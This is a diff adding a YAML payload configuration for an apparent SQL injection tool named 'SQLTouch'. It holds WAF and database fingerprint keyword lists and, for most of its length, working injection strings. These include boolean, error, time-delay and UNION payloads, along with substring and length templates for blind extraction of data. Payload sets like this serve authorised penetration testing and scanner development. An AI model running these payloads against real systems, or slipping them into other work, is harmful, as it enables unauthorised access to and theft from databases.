@@ -1,0 +1,111 @@
+# SQLTouch Payloads Configuration
+# Version: 2.0.0
+
+# WAF Signatures
+waf_signatures:
+  - cloudflare
+  - mod_security
+  - sucuri
+  - barracuda
+  - fortinet
+  - imperva
+  - aws_waf
+  - akamai
+  - incapsula
+
+# Error keywords for detection
+error_keywords:
+  - sql
+  - mysql
+  - syntax
+  - unclosed
+  - quotes
+  - warning
+  - error
+  - mysql_fetch
+  - odbc
+  - driver
+  - ora
+  - mssql
+  - postgresql
+
+# DBMS Signatures
+dbms_signatures:
+  mysql:
+    - mysql
+    - mysql_fetch
+    - mariadb
+    - sqlstate
+  mssql:
+    - microsoft
+    - sql server
+    - mssql
+    - @@version
+  postgresql:
+    - postgresql
+    - postgres
+    - pg_connect
+  oracle:
+    - oracle
+    - ora
+    - oci8
+  sqlite:
+    - sqlite
+    - sqlite_
+
+# Boolean-based payloads
+boolean_payloads:
+  true:
+    - "1' AND '1'='1"
+    - "1' AND 1=1--"
+    - "1' AND TRUE--"
+    - "1' AND '1' LIKE '1'--"
+  false:
+    - "1' AND '1'='2"
+    - "1' AND 1=2--"
+    - "1' AND FALSE--"
+    - "1' AND '1' LIKE '2'--"
+
+# Error-based payloads
+error_payloads:
+  - "'"
+  - '"'
+  - "\\"
+  - "'--"
+  - '"--'
+  - "' OR '1'='1"
+  - "' OR 1=1--"
+  - "' UNION SELECT NULL--"
+  - "' AND 1=CONVERT(int, @@version)--"
+
+# Time-based payloads
+time_payloads:
+  mysql:
+    - "1' AND SLEEP(3)--"
+    - "1' AND IF(1=1, SLEEP(3), 0)--"
+  mssql:
+    - "1' WAITFOR DELAY '0:0:3'--"
+  postgresql:
+    - "1' AND pg_sleep(3)--"
+  oracle:
+    - "1' AND DBMS_LOCK.SLEEP(3)--"
+
+# Union-based payloads
+union_payloads:
+  order_by:
+    - "' ORDER BY {num}--"
+    - "' ORDER BY {num}#"
+  union_select:
+    - "' UNION SELECT {columns}--"
+    - "' UNION ALL SELECT {columns}--"
+    - "' UNION SELECT {columns} FROM information_schema.tables--"
+
+# Extraction templates
+extraction_templates:
+  substring:
+    - "SUBSTRING(({query}),{pos},1)='{char}'"
+    - "MID(({query}),{pos},1)='{char}'"
+    - "SUBSTR(({query}),{pos},1)='{char}'"
+  length:
+    - "LENGTH(({query}))>{pos}"
+    - "CHAR_LENGTH(({query}))>{pos}"
